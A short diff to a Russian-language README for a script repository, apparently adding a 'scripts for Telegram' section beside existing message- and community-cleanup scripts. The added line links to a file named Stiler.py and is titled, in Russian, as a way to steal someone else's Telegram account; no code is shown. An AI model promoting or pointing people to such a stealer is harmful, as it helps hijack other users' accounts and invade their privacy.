@@ -12,3 +12,7 @@
 4. [Очистка сообщений](https://github.com/qqaazzg/SCRIPTS/blob/main/Clearing%20dialogs)
 5. [Очистка исходящих заявок](https://github.com/qqaazzg/SCRIPTS/blob/main/%D0%A1learing%20outgoing%20requests)
 6. [Очистка сообществ](https://github.com/qqaazzg/SCRIPTS/blob/main/%D0%A1ommunity%20cleansing)
+
+# скрипты для Telegram
+
+1. [Можно украсть чужой аккаунт Telegram](https://github.com/qqaazzg/SCRIPTS/blob/main/Stiler.py)
